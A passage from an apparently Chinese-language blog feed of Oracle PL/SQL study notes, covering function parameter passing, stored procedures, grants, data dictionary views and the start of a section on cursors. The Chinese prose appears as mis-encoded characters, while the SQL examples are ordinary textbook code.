çš„åŒºåˆ«ã€‚</span><br></pre></td></tr></table></figure>
<h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼šè·å–æŸéƒ¨é—¨å‘˜å·¥æ•°å’Œå·¥èµ„æ€»å’Œ </span><br><span class="line">CREATE OR REPLACE FUNCTION get_salary(</span><br><span class="line">    Dept_no NUMBER, </span><br><span class="line">    Emp_count OUT NUMBER) </span><br><span class="line">RETURN NUMBER  </span><br><span class="line">IS </span><br><span class="line">    V_sum NUMBER;</span><br><span class="line">BEGIN </span><br><span class="line"> 	SELECT SUM(sal), count(*) INTO V_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no;</span><br><span class="line">  	--empè¡¨ä¸­dept_noæ˜¯å”¯ä¸€Key </span><br><span class="line"> 	RETURN v_sum; </span><br><span class="line">EXCEPTION </span><br><span class="line">     WHEN NO_DATA_FOUND THEN  </span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#39;ä½ éœ€è¦çš„æ•°æ®ä¸å­˜åœ¨!&#39;); </span><br><span class="line">     WHEN OTHERS THEN  </span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); </span><br><span class="line">END get_salary;</span><br></pre></td></tr></table></figure>
<h3 id="è°ƒç”¨å‡½æ•°æ–¹æ³•"><a href="#è°ƒç”¨å‡½æ•°æ–¹æ³•" class="headerlink" title="è°ƒç”¨å‡½æ•°æ–¹æ³•"></a>è°ƒç”¨å‡½æ•°æ–¹æ³•</h3><ul>
<li>å‡½æ•°å£°æ˜æ—¶æ‰€å®šä¹‰çš„å‚æ•°ç§°ä¸ºå½¢å¼å‚æ•°ï¼Œåº”ç”¨ç¨‹åºè°ƒç”¨æ—¶ä¸ºå‡½æ•°ä¼ é€’çš„å‚æ•°ç§°ä¸ºå®é™…å‚æ•°ã€‚</li>
<li>åº”ç”¨ç¨‹åºåœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹æ³•å‘å‡½æ•°ä¼ é€’å‚æ•°ï¼š</li>
</ul>
<h4 id="ä½ç½®è¡¨ç¤ºæ³•"><a href="#ä½ç½®è¡¨ç¤ºæ³•" class="headerlink" title="ä½ç½®è¡¨ç¤ºæ³•"></a>ä½ç½®è¡¨ç¤ºæ³•</h4><h5 id="æ ¼å¼"><a href="#æ ¼å¼" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">argument_value1[,argument_value2 â€¦]</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong>ç±»å‹åºåˆ—å¿…é¡»ä¸å‡½æ•°å£°æ˜æ˜¯çš„ç±»å‹åºåˆ—ç›¸åŒ</p>
<h5 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼šè®¡ç®—æŸéƒ¨é—¨çš„å‘˜å·¥æ•°å’Œå·¥èµ„æ€»å’Œ </span><br><span class="line">DECLARE </span><br><span class="line">	V_num NUMBER; </span><br><span class="line">	V_sum NUMBER; </span><br><span class="line">BEGIN </span><br><span class="line">	V_sum :&#x3D;get_salary(30, v_num); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(&#39;30å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="åç§°è¡¨ç¤ºæ³•"><a href="#åç§°è¡¨ç¤ºæ³•" class="headerlink" title="åç§°è¡¨ç¤ºæ³•"></a>åç§°è¡¨ç¤ºæ³•</h4><h5 id="æ ¼å¼-1"><a href="#æ ¼å¼-1" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">argument &#x3D;&gt; parameter [,â€¦]</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>argument ä¸ºå½¢å¼å‚æ•°ï¼Œå®ƒå¿…é¡»ä¸å‡½æ•°å®šä¹‰æ—¶æ‰€å£°æ˜çš„å½¢å¼å‚æ•°åç§°ä»¥åŠç±»å‹ç›¸åŒã€‚Parameter ä¸ºå®é™…å‚æ•°ã€‚</li>
<li>åœ¨è¿™ç§æ ¼å¼ä¸­ï¼Œå½¢å¼å‚æ•°ä¸å®é™…å‚æ•°æˆå¯¹å‡ºç°ï¼Œç›¸äº’é—´å…³ç³»å”¯ä¸€ç¡®å®šï¼Œæ‰€ä»¥å‚æ•°çš„é¡ºåºå¯ä»¥ä»»æ„æ’åˆ—ã€‚</li>
</ul>
<h5 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¾‹ï¼šè®¡ç®—æŸéƒ¨é—¨çš„å‘˜å·¥æ•°å’Œå·¥èµ„æ€»å’Œ </span><br><span class="line">DECLARE </span><br><span class="line">	V_num NUMBER; </span><br><span class="line">	V_sum NUMBER; </span><br><span class="line">BEGIN </span><br><span class="line">	V_sum :&#x3D;get_salary(emp_count &#x3D;&gt; v_num, dept_no &#x3D;&gt; 30); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(&#39;30å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="æ··åˆè¡¨ç¤ºæ³•"><a href="#æ··åˆè¡¨ç¤ºæ³•" class="headerlink" title="æ··åˆè¡¨ç¤ºæ³•"></a>æ··åˆè¡¨ç¤ºæ³•</h4><ul>
<li>å³åœ¨è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼ŒåŒæ—¶ä½¿ç”¨ä½ç½®è¡¨ç¤ºæ³•å’Œåç§°è¡¨ç¤ºæ³•ä¸ºå‡½æ•°ä¼ é€’å‚æ•°ã€‚</li>
<li>é‡‡ç”¨è¿™ç§å‚æ•°ä¼ é€’æ–¹æ³•æ—¶ï¼Œä½¿ç”¨<strong>ä½ç½®è¡¨ç¤ºæ³•</strong>æ‰€ä¼ é€’çš„å‚æ•°å¿…é¡»æ”¾åœ¨<strong>åç§°è¡¨ç¤ºæ³•</strong>æ‰€ä¼ é€’çš„å‚æ•°<strong>å‰é¢</strong>ã€‚</li>
<li>ä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºå‡½æ•°å…·æœ‰å¤šå°‘ä¸ªå‚æ•°ï¼Œåªè¦å…¶ä¸­æœ‰ä¸€ä¸ªå‚æ•°ä½¿ç”¨åç§°è¡¨ç¤ºæ³•ï¼Œå…¶åæ‰€æœ‰çš„å‚æ•°éƒ½å¿…é¡»ä½¿ç”¨åç§°è¡¨ç¤ºæ³•ã€‚</li>
</ul>
<h5 id="ç¤ºä¾‹-3"><a href="#ç¤ºä¾‹-3" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼š </span><br><span class="line">DECLARE  </span><br><span class="line">    Var VARCHAR2(32); </span><br><span class="line">BEGIN </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user1&#39;, 30, sex &#x3D;&gt; &#39;ç”·&#39;); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40, sex &#x3D;&gt; &#39;ç”·&#39;); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;å¥³&#39;, age &#x3D;&gt; 20); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="å‚æ•°é»˜è®¤å€¼"><a href="#å‚æ•°é»˜è®¤å€¼" class="headerlink" title="å‚æ•°é»˜è®¤å€¼"></a>å‚æ•°é»˜è®¤å€¼</h4><p>åœ¨CREATE OR REPLACE FUNCTION è¯­å¥ä¸­å£°æ˜å‡½æ•°å‚æ•°æ—¶å¯ä»¥ä½¿ç”¨DEFAULTå…³é”®å­—ä¸ºè¾“å…¥å‚æ•°æŒ‡å®šé»˜è®¤å€¼ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--å®šä¹‰ç¤ºä¾‹ï¼š </span><br><span class="line">CREATE OR REPLACE FUNCTION demo_fun( </span><br><span class="line">	Name VARCHAR2,Age INTEGER, </span><br><span class="line">	Sex VARCHAR2 DEFAULT &#39;ç”·&#39;) </span><br><span class="line">RETURN VARCHAR2  </span><br><span class="line">IS </span><br><span class="line">   V_var VARCHAR2(32); </span><br><span class="line">BEGIN </span><br><span class="line">	V_var :&#x3D; name||&#39;ï¼š&#39;||TO_CHAR(age)||&#39;å²ï¼Œ&#39;||sex; </span><br><span class="line">   RETURN v_var; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>å…·æœ‰é»˜è®¤å€¼çš„å‡½æ•°åˆ›å»ºåï¼Œåœ¨å‡½æ•°è°ƒç”¨æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¸ºå…·æœ‰é»˜è®¤å€¼çš„å‚æ•°æä¾›å®é™…å‚æ•°å€¼ï¼Œå‡½æ•°å°†ä½¿ç”¨è¯¥å‚æ•°çš„é»˜è®¤å€¼ã€‚</li>
<li>ä½†å½“è°ƒç”¨è€…ä¸ºé»˜è®¤å‚æ•°æä¾›å®é™…å‚æ•°æ—¶ï¼Œå‡½æ•°å°†ä½¿ç”¨å®é™…å‚æ•°å€¼ã€‚</li>
<li>åœ¨åˆ›å»ºå‡½æ•°æ—¶ï¼Œåªèƒ½ä¸ºè¾“å…¥å‚æ•°è®¾ç½®é»˜è®¤å€¼ï¼Œè€Œä¸èƒ½ä¸ºè¾“å…¥/è¾“å‡ºå‚æ•°è®¾ç½®é»˜è®¤å€¼ã€‚</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--è°ƒç”¨ç¤ºä¾‹ï¼š </span><br><span class="line">DECLARE  </span><br><span class="line">    Var VARCHAR(32); </span><br><span class="line">BEGIN </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user1&#39;, 30); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">	Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;å¥³&#39;, age &#x3D;&gt; 20); </span><br><span class="line">	DBMS_OUTPUT.PUT_LINE(var); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="å­˜å‚¨è¿‡ç¨‹"><a href="#å­˜å‚¨è¿‡ç¨‹" class="headerlink" title="å­˜å‚¨è¿‡ç¨‹"></a>å­˜å‚¨è¿‡ç¨‹</h2><h3 id="åˆ›å»ºå­˜å‚¨è¿‡ç¨‹"><a href="#åˆ›å»ºå­˜å‚¨è¿‡ç¨‹" class="headerlink" title="åˆ›å»ºå­˜å‚¨è¿‡ç¨‹"></a>åˆ›å»ºå­˜å‚¨è¿‡ç¨‹</h3><h4 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] PROCEDURE Procedure_name </span><br><span class="line">[ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type, </span><br><span class="line">   argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] </span><br><span class="line">&#123; IS | AS &#125; </span><br><span class="line"> &lt;ç±»å‹.å˜é‡çš„è¯´æ˜&gt;   </span><br><span class="line">BEGIN </span><br><span class="line"> &lt;æ‰§è¡Œéƒ¨åˆ†&gt; </span><br><span class="line">EXCEPTION </span><br><span class="line"> &lt;å¯é€‰çš„å¼‚å¸¸é”™è¯¯å¤„ç†ç¨‹åº&gt; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h4 id="ç¤ºä¾‹-4"><a href="#ç¤ºä¾‹-4" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ ï¼šåˆ é™¤æŒ‡å®šå‘˜å·¥è®°å½• </span><br><span class="line">CREATE OR REPLACE PROCEDURE DelEmp </span><br><span class="line">  (v_empno IN emp.empno%TYPE)  </span><br><span class="line">AS </span><br><span class="line">	No_result EXCEPTION; </span><br><span class="line">BEGIN </span><br><span class="line">	DELETE FROM emp WHERE empno&#x3D;v_empno; </span><br><span class="line">	IF SQL%NOTFOUND THEN </span><br><span class="line">    	RAISE no_result; </span><br><span class="line">    END IF; </span><br><span class="line">       DBMS_OUTPUT.PUT_LINE(&#39;ç¼–ç ä¸º&#39;||v_empno||&#39;çš„å‘˜å·¥å·²è¢«é™¤å!&#39;);</span><br><span class="line">	EXCEPTION </span><br><span class="line">		WHEN no_result THEN  </span><br><span class="line">			DBMS_OUTPUT.PUT_LINE(&#39;ä½ éœ€è¦çš„æ•°æ®ä¸å­˜åœ¨!&#39;); </span><br><span class="line">		WHEN OTHERS THEN </span><br><span class="line">      		DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); </span><br><span class="line">END DelEmp;</span><br></pre></td></tr></table></figure>
<h3 id="è°ƒç”¨å­˜å‚¨è¿‡ç¨‹"><a href="#è°ƒç”¨å­˜å‚¨è¿‡ç¨‹" class="headerlink" title="è°ƒç”¨å­˜å‚¨è¿‡ç¨‹"></a>è°ƒç”¨å­˜å‚¨è¿‡ç¨‹</h3><p>å­˜å‚¨è¿‡ç¨‹å»ºç«‹å®Œæˆåï¼Œåªè¦é€šè¿‡æˆæƒï¼Œç”¨æˆ·å°±å¯ä»¥åœ¨SQLPLUS ã€ORACLEå¼€å‘å·¥å…·æˆ–ç¬¬ä¸‰æ–¹å¼€å‘å·¥å…·ä¸­æ¥è°ƒç”¨è¿è¡Œã€‚ORACLE ä½¿ç”¨EXECUTE è¯­å¥æ¥å®ç°å¯¹å­˜å‚¨è¿‡ç¨‹çš„è°ƒç”¨</p>
<h4 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC[UTE]  Procedure_name( parameter1, parameter2â€¦)</span><br></pre></td></tr></table></figure>
<h4 id="ç¤ºä¾‹-5"><a href="#ç¤ºä¾‹-5" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--sqlplusè°ƒç”¨ç¤ºä¾‹</span><br><span class="line">SQL&gt; EXECUTE DelEmp(10)ï¼› </span><br><span class="line">SQL&gt; EXECUTE DelEmp(:a)ï¼›   </span><br><span class="line"> </span><br><span class="line">SQL&gt; variable a varchar2(20) </span><br><span class="line">SQL&gt; execute :a:&#x3D;fun_stu(&#39;BA&#39;);</span><br><span class="line">--ä¾‹ï¼šè®¡ç®—æŒ‡å®šéƒ¨é—¨çš„å·¥èµ„æ€»å’Œï¼Œå¹¶ç»Ÿè®¡å…¶ä¸­çš„èŒå·¥æ•°é‡ã€‚ </span><br><span class="line">--åˆ›å»ºå­˜å‚¨è¿‡ç¨‹</span><br><span class="line">CREATE OR REPLACE PROCEDURE proc_demo </span><br><span class="line">	(Dept_no NUMBER DEFAULT 10 , Sal_sum OUT NUMBER, </span><br><span class="line">	Emp_count OUT NUMBER) </span><br><span class="line">IS </span><br><span class="line">BEGIN </span><br><span class="line">	SELECT SUM(sal), COUNT(*) INTO sal_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no; </span><br><span class="line">	EXCEPTION </span><br><span class="line">     	WHEN NO_DATA_FOUND THEN  </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(&#39;ä½ éœ€è¦çš„æ•°æ®ä¸å­˜åœ¨!&#39;); </span><br><span class="line">     	WHEN OTHERS THEN  </span><br><span class="line">        	DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); </span><br><span class="line"> END proc_demo;</span><br><span class="line">--è°ƒç”¨å­˜å‚¨è¿‡ç¨‹: </span><br><span class="line">DECLARE </span><br><span class="line">	V_num NUMBER; </span><br><span class="line">  	V_sum NUMBER(8, 2); </span><br><span class="line">BEGIN </span><br><span class="line"> 	Proc_demo(30, v_sum, v_num); </span><br><span class="line">  	DBMS_OUTPUT.PUT_LINE(&#39;30å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); </span><br><span class="line">  	Proc_demo(sal_sum &#x3D;&gt; v_sum, emp_count &#x3D;&gt; v_num); </span><br><span class="line">  	DBMS_OUTPUT.PUT_LINE(&#39;10å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="æŸ¥è¯¢ã€åˆ é™¤è¿‡ç¨‹å’Œå‡½æ•°"><a href="#æŸ¥è¯¢ã€åˆ é™¤è¿‡ç¨‹å’Œå‡½æ•°" class="headerlink" title="æŸ¥è¯¢ã€åˆ é™¤è¿‡ç¨‹å’Œå‡½æ•°"></a>æŸ¥è¯¢ã€åˆ é™¤è¿‡ç¨‹å’Œå‡½æ•°</h2><ul>
<li><p>åœ¨SQL*PLUS ä¸­ï¼Œå¯ä»¥ç”¨DESCRIBE å‘½ä»¤æŸ¥çœ‹è¿‡ç¨‹çš„åå­—åŠå…¶å‚æ•°</p>
<p><code>DESCRIBE Procedure_name;</code><br>(desc table; ç”¨äºåˆ—å‡ºæŒ‡å®šè¡¨æˆ–è§†å›¾ä¸­çš„æ‰€æœ‰åˆ—)</p>
</li>
<li><p>å¯ä»¥ä½¿ç”¨DROPè¯­å¥åˆ é™¤å‡½æ•°å’Œè¿‡ç¨‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--åˆ é™¤å‡½æ•°</span><br><span class="line">DROP FUNCTION function_name;</span><br><span class="line">--åˆ é™¤è¿‡ç¨‹</span><br><span class="line">DROP PROCEDURE proceduer_name;</span><br></pre></td></tr></table></figure>
<h2 id="æˆæƒæ‰§è¡Œæƒç»™ç›¸å…³çš„ç”¨æˆ·æˆ–è§’è‰²"><a href="#æˆæƒæ‰§è¡Œæƒç»™ç›¸å…³çš„ç”¨æˆ·æˆ–è§’è‰²" class="headerlink" title="æˆæƒæ‰§è¡Œæƒç»™ç›¸å…³çš„ç”¨æˆ·æˆ–è§’è‰²"></a>æˆæƒæ‰§è¡Œæƒç»™ç›¸å…³çš„ç”¨æˆ·æˆ–è§’è‰²</h2></li>
<li><p>å¦‚æœè°ƒå¼æ­£ç¡®çš„å­˜å‚¨è¿‡ç¨‹æ²¡æœ‰è¿›è¡Œæˆæƒï¼Œé‚£å°±åªæœ‰å»ºç«‹è€…æœ¬äººæ‰å¯ä»¥è¿è¡Œã€‚æ‰€ä»¥ä½œä¸ºåº”ç”¨ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†çš„å­˜å‚¨è¿‡ç¨‹ä¹Ÿå¿…é¡»è¿›è¡Œæˆæƒæ‰èƒ½è¾¾åˆ°è¦æ±‚ã€‚</p>
</li>
<li><p>å¯ä»¥ç”¨GRANTå‘½ä»¤æ¥è¿›è¡Œå­˜å‚¨è¿‡ç¨‹çš„è¿è¡Œæˆæƒ</p>
</li>
</ul>
<h4 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹</span><br><span class="line">GRANT EXECUTE ON Proc_demo TO user| role | PUBLIC  </span><br><span class="line">	[WITH GRANT OPTION]</span><br></pre></td></tr></table></figure>
<h2 id="ä¸è¿‡ç¨‹ç›¸å…³çš„å†…ç½®æ•°æ®å­—å…¸"><a href="#ä¸è¿‡ç¨‹ç›¸å…³çš„å†…ç½®æ•°æ®å­—å…¸" class="headerlink" title="ä¸è¿‡ç¨‹ç›¸å…³çš„å†…ç½®æ•°æ®å­—å…¸"></a>ä¸è¿‡ç¨‹ç›¸å…³çš„å†…ç½®æ•°æ®å­—å…¸</h2><table>
<thead>
<tr>
<th align="left">åç§°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">USER_PROCEDURES</td>
<td align="left">æŸ¥è¯¢ç”¨æˆ·æ‰€æœ‰çš„å­ç¨‹åºä¿¡æ¯</td>
</tr>
<tr>
<td align="left">USER_SOURCE</td>
<td align="left">æŸ¥çœ‹ç”¨æˆ·æ‰€æœ‰å¯¹è±¡çš„æºä»£ç </td>
</tr>
<tr>
<td align="left">USER_OBJECTS</td>
<td align="left">æŸ¥çœ‹ç”¨æˆ·åˆ›å»ºçš„è¿‡ç¨‹å¯¹è±¡</td>
</tr>
<tr>
<td align="left">USER_ERRORS</td>
<td align="left">æŸ¥çœ‹ç”¨æˆ·æ‰€æœ‰çš„å­ç¨‹åºé”™è¯¯ä¿¡æ¯</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT object_name,authid,object_type FROM user_procedures;</span><br><span class="line">--AUTHID DEFINER ï¼ˆå®šä¹‰è€…æƒé™ï¼‰ï¼šæŒ‡ç¼–è¯‘å­˜å‚¨å¯¹è±¡çš„æ‰€æœ‰è€…ã€‚ä¹Ÿæ˜¯é»˜è®¤æƒé™æ¨¡å¼ </span><br><span class="line">--AUTHID CURRENT_USERï¼ˆè°ƒç”¨è€…æƒé™ï¼‰ï¼šæŒ‡æ‹¥æœ‰å½“å‰ä¼šè¯æƒé™çš„æ¨¡å¼ </span><br><span class="line"></span><br><span class="line">SELECT * FROM user_source WHERE name&#x3D;&#39;MLDN_PROC&#39; ;</span><br><span class="line"></span><br><span class="line">SELECT object_name,created,timestamp,status FROM user_objects </span><br><span class="line">WHERE object_type&#x3D;&#39;PROCEDURE&#39; OR object_type&#x3D;&#39;FUNCTION&#39;; </span><br><span class="line">--statusï¼šè¯¥å­—æ®µæœ‰ä¸¤ä¸ªå–å€¼ï¼šVALIDï¼ˆæœ‰æ•ˆï¼‰ï¼ŒINVALIDï¼ˆæ— æ•ˆï¼‰</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>plsqlæ¸¸æ ‡</title>
    <url>/2019/12/17/Oracle/plsql%E6%B8%B8%E6%A0%87/</url>
    <content><![CDATA[<h1 id="plsqlæ¸¸æ ‡"><a href="#plsqlæ¸¸æ ‡" class="headerlink" title="plsqlæ¸¸æ ‡"></a>plsqlæ¸¸æ ‡</h1><h2 id="æ¸¸æ ‡"><a href="#æ¸¸æ ‡" class="headerlink" title="æ¸¸æ ‡"></a>æ¸¸æ ‡</h2><table>
<thead>
<tr>
<th align="left">SQLè¯­å¥</th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">éæŸ¥è¯¢è¯­å¥</td>
<td align="left">éšå¼çš„</td>
</tr>
<tr>
<td align="left">ç»“æœæ˜¯å•è¡Œçš„æŸ¥è¯¢è¯­å¥</td>
<td align="left">éšå¼æˆ–æ˜¾ç¤ºçš„</td>
</tr>
<tr>
<td align="left">ç»“æœæ˜¯å¤šè¡Œçš„æŸ¥è¯¢è¯­å¥</td>
<td align="left">æ˜¾ç¤ºçš„</td>
</tr>
</tbody></table>
<a id="more"></a>
<h3 id="æ˜¾ç¤ºæ¸¸æ ‡"><a href="#æ˜¾ç¤ºæ¸¸æ ‡" class="headerlink" title="æ˜¾ç¤ºæ¸¸æ ‡"></a>æ˜¾ç¤ºæ¸¸æ ‡</h3><h4 id="å®šä¹‰æ¸¸æ ‡ï¼š"><a href="#å®šä¹‰æ¸¸æ ‡ï¼š" class="headerlink" title="å®šä¹‰æ¸¸æ ‡ï¼š"></a>å®šä¹‰æ¸¸æ ‡ï¼š</h4><p>å°±æ˜¯å®šä¹‰ä¸€ä¸ªæ¸¸æ ‡åï¼Œä»¥åŠä¸å…¶ç›¸å¯¹åº”çš„SELECT è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CURSOR cursor_name IS  select_statement;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>æ¸¸æ ‡å£°æ˜éƒ¨åˆ†æ˜¯å”¯ä¸€å¯ä»¥å‡ºç°åœ¨æ¨¡å—å£°æ˜éƒ¨åˆ†çš„æ­¥éª¤ï¼Œå…¶ä»–ä¸‰ä¸ª<br>æ­¥éª¤éƒ½åœ¨æ‰§è¡Œæˆ–å¼‚å¸¸å¤„ç†éƒ¨åˆ†ä¸­</li>
<li>æ¸¸æ ‡åæ˜¯æ ‡è¯†ç¬¦ï¼Œæ‰€ä»¥ä¹Ÿæœ‰ä½œç”¨åŸŸï¼Œå¹¶ä¸”å¿…é¡»åœ¨ä½¿ç”¨å‰è¿›è¡Œè¯´æ˜</li>
<li>ä»»ä½•SELECTè¯­å¥éƒ½æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯SELECT â€¦INTOè¯­å¥æ˜¯éæ³•çš„</li>
<li>åœ¨å£°æ˜éƒ¨åˆ†çš„æœ«å°¾å£°æ˜æ¸¸æ ‡</li>
</ul>
<h4 id="æ‰“å¼€æ¸¸æ ‡ï¼š"><a href="#æ‰“å¼€æ¸¸æ ‡ï¼š" class="headerlink" title="æ‰“å¼€æ¸¸æ ‡ï¼š"></a>æ‰“å¼€æ¸¸æ ‡ï¼š</h4><p>å°±æ˜¯æ‰§è¡Œæ¸¸æ ‡æ‰€å¯¹åº”çš„SELECTè¯­å¥ï¼Œå°†å…¶æŸ¥è¯¢ç»“æœæ”¾å…¥å·¥ä½œåŒºï¼Œå¹¶ä¸”æŒ‡é’ˆæŒ‡å‘å·¥ä½œåŒºçš„é¦–éƒ¨ï¼Œæ ‡è¯†æ¸¸æ ‡ç»“æœé›†åˆã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPEN cursor_name</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong>PL/SQL ç¨‹åºä¸èƒ½ç”¨OPEN è¯­å¥é‡å¤æ‰“å¼€åŒä¸€ä¸ªæ¸¸æ ‡</p>
<h4 id="æå–æ¸¸æ ‡ï¼š"><a href="#æå–æ¸¸æ ‡ï¼š" class="headerlink" title="æå–æ¸¸æ ‡ï¼š"></a>æå–æ¸¸æ ‡ï¼š</h4><p>å°±æ˜¯æ£€ç´¢ç»“æœé›†åˆä¸­çš„æ•°æ®è¡Œï¼Œæ”¾å…¥æŒ‡å®šçš„è¾“å‡ºå˜é‡ä¸­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FETCH cursor_name INTO &#123;variable_list | record_variable &#125;;</span><br></pre></td></tr></table></figure>
<h4 id="å…³é—­æ¸¸æ ‡ï¼š"><a href="#å…³é—­æ¸¸æ ‡ï¼š" class="headerlink" title="å…³é—­æ¸¸æ ‡ï¼š"></a>å…³é—­æ¸¸æ ‡ï¼š</h4><p>å½“æå–å’Œå¤„ç†å®Œæ¸¸æ ‡ç»“æœé›†åˆæ•°æ®åï¼Œåº”åŠæ—¶å…³é—­æ¸¸æ ‡ï¼Œä»¥é‡Šæ”¾è¯¥æ¸¸æ ‡æ‰€å ç”¨çš„ç³»ç»Ÿèµ„æºï¼Œå¹¶ä½¿è¯¥æ¸¸æ ‡çš„å·¥ä½œåŒºå˜æˆæ— æ•ˆï¼Œä¸èƒ½å†ä½¿ç”¨FETCH è¯­å¥å–å…¶ä¸­æ•°æ®ã€‚å…³é—­åçš„æ¸¸æ ‡å¯ä»¥ä½¿ç”¨OPEN è¯­å¥é‡æ–°æ‰“å¼€ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CLOSE cursor_name;</span><br></pre></td></tr></table></figure>
<h4 id="æ¸¸æ ‡å±æ€§"><a href="#æ¸¸æ ‡å±æ€§" class="headerlink" title="æ¸¸æ ‡å±æ€§"></a>æ¸¸æ ‡å±æ€§</h4><table>
<thead>
<tr>
<th align="left">å±æ€§</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%FOUND</td>
<td align="left">å¸ƒå°”å‹å±æ€§ï¼Œå½“æœ€è¿‘ä¸€æ¬¡è¯»è®°å½•æ—¶æˆåŠŸè¿”å›,åˆ™å€¼ä¸ºTRUE</td>
</tr>
<tr>
<td align="left">%NOTFOUND</td>
